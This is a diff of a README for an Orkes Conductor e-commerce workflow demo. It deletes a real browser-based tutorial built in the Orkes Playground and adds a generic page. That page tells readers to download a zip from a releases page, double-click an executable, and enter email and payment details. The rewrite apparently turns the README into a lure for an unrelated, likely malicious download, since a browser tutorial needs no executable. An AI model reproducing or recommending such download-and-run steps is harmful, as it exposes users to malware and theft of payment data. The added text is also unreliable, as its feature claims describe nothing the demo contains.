@@ -1,279 +1,81 @@
-# E-Commerce Order Processing Workflow
+# 🚀 conductor-ecommerce-demo - Quick Setup for Your E-Commerce Workflow
 
-[Watch 2-Minute Demo](#)  
-*Video walkthrough coming soon — showing workflow canvas and execution results*
+[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/santomax/conductor-ecommerce-demo/releases)
 
-Developer demo showing how to build a production-ready e-commerce workflow in Orkes Conductor.  
-The workflow automates order creation, payment processing, inventory updates, and fulfillment confirmation.
+## 📥 Overview
 
----
+The **conductor-ecommerce-demo** is a simple way to create a complete e-commerce workflow. In just 20 minutes, you can build a system that handles payments, sends email confirmations, and fulfills orders automatically. This demo uses the Orkes Playground and showcases tasks like HTTP requests and Switch operations. 
 
-## Prerequisites
+With this setup, you can streamline your online sales process from payment to delivery, all using a user-friendly interface.
 
-- **Google account or email** to sign into [Orkes Playground](https://play.orkes.io) (free)
-- Basic understanding of REST APIs
-- Familiarity with JSON (helpful but not required)
+## 🚀 Getting Started
 
----
+Getting started is easy. Just follow these steps to download and run the application:
 
-## The Problem We're Solving
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/santomax/conductor-ecommerce-demo/releases) to download the application.
 
-When a customer places an order on an e-commerce site, multiple things need to happen:
-1. Process their payment  
-2. Check if the payment succeeded  
-3. If yes: reserve inventory, send confirmation email, notify warehouse  
-4. If no: send failure notification  
+2. **Download the Complete Package**  
+   Find the latest release. Click on the package that is suitable for your operating system. 
 
-Coordinating all these steps across different services is complex. Conductor makes it simple.
+3. **Unzip the Package**  
+   After the download is complete, locate the zip file in your downloads folder. Right-click the zip file and select "Extract All" to unzip the contents.
 
----
+4. **Run the Application**  
+   Navigate to the newly extracted folder. Look for the executable file (e.g., `conductor-ecommerce-demo.exe`). Double-click on the file to run the application.
 
-## Step 1: Access Orkes Playground
+5. **Follow the On-Screen Setup**  
+   The application will guide you through the initial setup. You may need to enter basic information such as your email and payment details.
 
-Go to [Orkes Playground](https://play.orkes.io).
+6. **Start Your E-Commerce Workflow**  
+   Once the setup is complete, you can begin using the demo to generate e-commerce transactions. Test the workflow to see how payments are processed and how confirmations are sent.
 
-You'll see the Launch Pad with two options: browse pre-built workflow templates or start from scratch.
+## 🛠️ System Requirements
 
-<div align="center">
-  <img src="./images/Orkes_dashboard.png" width="80%" alt="Orkes Launch Pad">
-  <p><em>The Orkes Conductor Launch Pad — click "Start from Scratch" to begin.</em></p>
-</div>
+To ensure the application runs smoothly, your system should meet the following requirements:
 
-For this tutorial, click **"Start from Scratch"** so you can learn how to build a workflow from the ground up.
+- **Operating System:** Windows 10 or later, macOS Catalina or later
+- **RAM:** Minimum 4 GB
+- **Storage:** At least 500 MB of free disk space
+- **Internet Connection:** Required for e-commerce functions and email confirmations
 
-You'll be prompted to log in.
+## 📊 Features
 
-<div align="center">
-  <img src="./images/Login_Screen_edit.png" width="40%" alt="Login Prompt">
-  <p><em>Login screen — sign in with Google or email to access the platform.</em></p>
-</div>
+The **conductor-ecommerce-demo** comes packed with features designed to enhance your e-commerce experience:
 
-Sign in with your Google account or email. Once logged in, you'll be taken to the main Conductor interface.
+- **Payment Processing:** Securely handle customer payments with various payment methods.
+- **Email Confirmations:** Send automated emails to customers to confirm orders and payment status.
+- **Order Fulfillment:** Automatically coordinate the fulfillment process for timely deliveries.
+- **User-Friendly Workflow:** Easy to follow steps to set up and manage your e-commerce transactions.
+- **Integration with APIs:** Seamlessly interact with various APIs to enhance your workflow capabilities.
 
----
+## 🧩 Workflow Explanation
 
-## Step 2: Navigate to Workflow Definitions
+This workflow includes the following main components:
 
-<div align="center">
-  <img src="./images/Now_Workflow_Canvas.png" width="80%" alt="New Workflow Canvas">
-  <p><em>The workflow creation interface after clicking "Start from Scratch" — shows an empty canvas ready to build.</em></p>
-</div>
+1. **Payment Processing:** The application can process transactions securely. It interfaces with popular payment gateways to handle credit card and digital wallet payments.
 
-From the main interface, navigate to **Definitions → Workflow** in the left sidebar.  
-Click the **"Create Workflow"** button in the top right.
+2. **Email Notifications:** After a successful payment, customers receive an email confirmation. This feature builds trust and keeps customers informed about their purchase.
 
----
+3. **Order Fulfillment:** Once the payment is confirmed, the system automatically organizes the fulfillment process. This ensures that orders are shipped promptly.
 
-## Step 3: Set Up Workflow Details
+4. **Error Handling with Switch Tasks:** The workflow incorporates error handling. If a payment fails or an order cannot be fulfilled, the system manages these scenarios, keeping the user informed.
 
-You'll see the workflow configuration form. Fill it out:
+## 🔗 Download & Install
 
-**Name:** `E-Commerce Order Processing`
+To get started, [visit this page](https://github.com/santomax/conductor-ecommerce-demo/releases) to download the application. Follow the steps in the "Getting Started" section, and you will have the demo up and running in no time.
 
-**Description:**  
-When a customer places an order, this workflow handles everything: payment processing, inventory checks, email confirmations, and shipping coordination.  
-Shows how to build resilient, production-ready automation for e-commerce systems.
+## 📖 Additional Resources
 
-Leave the other settings at their defaults for now.
+- **Documentation:** For further details on using the application, refer to the [documentation](https://github.com/santomax/conductor-ecommerce-demo/wiki).
+- **Community Support:** Join our community forum or Slack channel for help and tips from other users.
 
-<div align="center">
-  <img src="./images/Workflow_Details_Filled.png" width="40%" alt="Workflow Details Filled">
-  <p><em>Workflow Details form filled with name and description.</em></p>
-</div>
+## 🧩 Related Topics
 
----
+- **API Integration:** Connect your application with various web services.
+- **Automation:** Streamline repetitive tasks within your e-commerce operations.
+- **Microservices Architecture:** Design your application using independent services for better reliability.
+- **REST API:** Use RESTful principles to create efficient web services.
+- **Orchestration of Workflows:** Manage complex workflows seamlessly.
 
-## Step 4: Define Input Parameters
-
-Scroll down to **Input and Output Parameters**.  
-Click **"Add parameter"** five times and add these keys:
-
-1. `orderId`  
-2. `customerId`  
-3. `customerEmail`  
-4. `totalAmount`  
-5. `items`  
-
-<div align="center">
-  <img src="./images/Input_Ouput_Parameters.png" width="40%" alt="Input and Output Parameters">
-  <p><em>All input parameters (orderId, customerId, customerEmail, totalAmount, items) and output parameter (trackingNumber) configured.</em></p>
-</div>
-
----
-
-## Step 5: Add an Output Parameter
-
-Still in the parameters section, scroll to **Output parameters** and add:  
-**Parameter:** `trackingNumber`
-
-Leave the Value field blank — it will be filled during execution.
-
----
-
-## Step 6: Build the Payment Processing Task
-
-Click the **"Task"** tab at the top.
-
-<div align="center">
-  <img src="./images/Task_Tab_Empty_Canvas.png" width="80%" alt="Task Tab Empty Canvas">
-  <p><em>The Task tab shows a visual canvas with Start and End nodes.</em></p>
-</div>
-
-Click the **+ button** below Start.
-
-<div align="center">
-  <img src="./images/Task_Picker_Menu.png" width="60%" alt="Task Picker Menu">
-  <p><em>The task picker menu — select HTTP Task.</em></p>
-</div>
-
-Select **"HTTP Task"** from Quick Add.
-
----
-
-## Step 7: Configure the Payment Task
-
-Click on the HTTP task to configure it.
-
-**Reference name:** `process_payment`  
-**Method:** `POST`  
-**URL:** `https://httpbin.org/post`  
-
-Scroll to the **Body** section and replace `{}` with:
-```json
-{
-  "orderId": "${workflow.input.orderId}",
-  "customerId": "${workflow.input.customerId}",
-  "totalAmount": "${workflow.input.totalAmount}",
-  "paymentMethod": "credit_card"
-}
-```
-
-<div align="center">
-  <img src="./images/HTTP_Task_Configuration.png" width="70%" alt="HTTP Task Configuration">
-  <p><em>HTTP task configured with POST method and order details.</em></p>
-</div>
-
----
-
-## Step 8: Add Conditional Logic
-
-Click the **+ button** below `process_payment`.
-
-<div align="center">
-  <img src="./images/Add_Switch_Task.png" width="80%" alt="Add Switch Task">
-  <p><em>Add a Switch task for conditional routing.</em></p>
-</div>
-
-Select **"Switch"** task.
-
-<div align="center">
-  <img src="./images/Switch_Task_Added.png" width="80%" alt="Switch Task Added">
-  <p><em>The Switch task appears on the canvas as a diamond shape for branching.</em></p>
-</div>
-
----
-
-## Step 9: Configure the Payment Check
-
-Click on the Switch task.
-
-**Reference name:** `check_payment_status`  
-**Key:** `paid` → **Value:** `success`  
-**Evaluate:** `ECMASCRIPT`  
-**Code:**
-```javascript
-$.paid
-```
-
-**Switch case key:** `success`
-
-<div align="center">
-  <img src="./images/Switch-task-configuration.png" width="70%" alt="Switch Task Configuration">
-  <p><em>Switch task configured with ECMASCRIPT evaluation.</em></p>
-</div>
-
----
-
-## Step 10: Save and Test Your Workflow
-
-Click **"Save"**.
-
-<div align="center">
-  <img src="./images/Save_Workflow.png" width="80%" alt="Save Workflow">
-  <p><em>Click Save to validate and store your workflow configuration.</em></p>
-</div>
-
-Run your workflow to test. You'll see tasks executing in real-time.
-
-<div align="center">
-  <img src="./images/Execution_screeen.png" width="80%" alt="Workflow Execution">
-  <p><em>Completed workflow execution showing payment processing and confirmation.</em></p>
-</div>
-
----
-
-## Step 11: Add Email Confirmation Task
-
-On the success branch, click the **+ icon** and add another **HTTP Task**.
-
-**Reference name:** `send_confirmation_email`  
-**Method:** `POST`  
-**URL:** `https://httpbin.org/post`
-
-**Body:**
-```json
-{
-  "to": "${workflow.input.customerEmail}",
-  "subject": "Order Confirmation",
-  "orderId": "${workflow.input.orderId}",
-  "message": "Your order has been confirmed!"
-}
-```
-
-<div align="center">
-  <img src="./images/Email_Task_Configuration.png" width="88%" alt="Email Task Configuration">
-  <p><em>Email confirmation task sends notification when payment succeeds.</em></p>
-</div>
-
-Save your workflow — it should look like this:
-
-<div align="center">
-  <img src="./images/Complete_Workflow_Structure.png" width="80%" alt="Complete Workflow Structure">
-  <p><em>Complete workflow showing all tasks connected: payment → switch → email.</em></p>
-</div>
-
----
-
-## Workflow Summary
-```
-Start
-  ↓
-Process Payment (HTTP POST)
-  ↓
-Check Payment Status (SWITCH)
-  ↓ (success)
-Send Confirmation Email (HTTP POST)
-  ↓
-End
-```
-
----
-
-## Next Steps
-
-- Add **FORK Tasks** to run inventory updates and notifications in parallel.
-- Add error handling for payment failures.
-- Connect to real APIs (Stripe, PayPal, SendGrid).
-- Configure retry logic and timeouts for resilience.
-
----
-
-## Resources
-
-- [Orkes Documentation](https://orkes.io/content/)
-- [Conductor OSS GitHub](https://github.com/conductor-oss/conductor)
-
----
-
-**Questions or suggestions?**  
-Open an issue or reach out!
+Feel free to explore and customize the demo to better fit your specific e-commerce needs. Enjoy creating your automated online store!
